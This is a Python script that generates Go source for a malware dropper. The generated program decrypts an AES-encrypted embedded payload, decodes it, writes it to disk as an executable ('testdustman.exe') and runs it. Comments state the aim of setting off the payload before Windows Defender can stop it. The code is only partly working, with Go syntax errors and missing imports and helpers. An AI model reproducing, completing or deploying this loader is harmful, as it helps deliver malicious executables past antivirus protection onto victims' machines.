#!/usr/bin/python3
# Reads the key, iv, and encrypted payload binary as bytes, and then writes it to a new go file
# Because apparently Golang does NOT support string template literals like JavaScript ES6, Python, and many other languages.
r = open('key.txt','rb')
key = r.readline()
r.close()

r = open('iv.txt','rb')
iv = r.readline()
r.close()

r = open('bPayloadEncrypted.txt','rb')
bPayloadEncrypted = r.read()
r.close()
print("DEBUG: Key:\r\n\t{}".format(str(key)))
print("DEBUG: IV:\r\n\t{}".format(str(iv)))
# print("DEBUG: Encrypted Payload:\r\n\t{{}}".format(str(bPayloadEncrypted)))
unCompiledPayload = """
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
)

var (
    key := []byte({})
    iv := []byte({})
    bPayloadEncrypted := []byte({})
)


func decrypt(key []byte, iv []byte, bPayloadEncrypted string) string {{
	ciphertext, _ := base64.URLEncoding.DecodeString(bPayloadEncrypted)

	block, err := aes.NewCipher(key)
	if err != nil {{
		panic(err)
	}}

	// The IV needs to be unique, but not secure. Therefore it's common to
	// include it at the beginning of the ciphertext.
	if len(ciphertext) < aes.BlockSize {{
		panic("ciphertext too short")
	}}
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)

	// XORKeyStream can work in-place if the two arguments are the same.
	stream.XORKeyStream(ciphertext, ciphertext)

	return fmt.Sprintf("%s", ciphertext)
}}


func main() {{

	// decrypter code
	payloadDecrypted := decrypt(key, iv, bPayloadEncrypted)
	fmt.Printf(payloadDecrypted)

	// So now a workaround is to make a "dropper" that writes a new file and then executes it. This does violate the in-memory execution method, which means it's a race-condition to set off the payload before Windows Defender stops it

	// We need the following things in the new go file
	// the key and IV - DONE
	// the f.write module - DONE
	decodedPayload, _ := base64.StdEncoding.DecodeString(payloadDecrypted)
	// proven it works, it matches the original payload, now write to a temp file and check if it matches the hash of Dustman.exe
	fmt.Printf(byteToString(decodedPayload))

	// base64 decoder - DONE
	// writer/dropper module
	ioutil.WriteFile("./testdustman.exe", decodedPayload, 0777)
	check(err)
	exec.Command("./testdustman.exe")
	// Now we need the standalone generator that contains the decrypter, decoder, and dropper. and encoded + encrypted payload

}}

""".format(
    str(key),
    str(iv),
    str(bPayloadEncrypted).encode('hex')
)
print(unCompiledPayload)
f = open("uncompiledEncryptedPayload.go", 'wb')
f.write(unCompiledPayload)
f.close()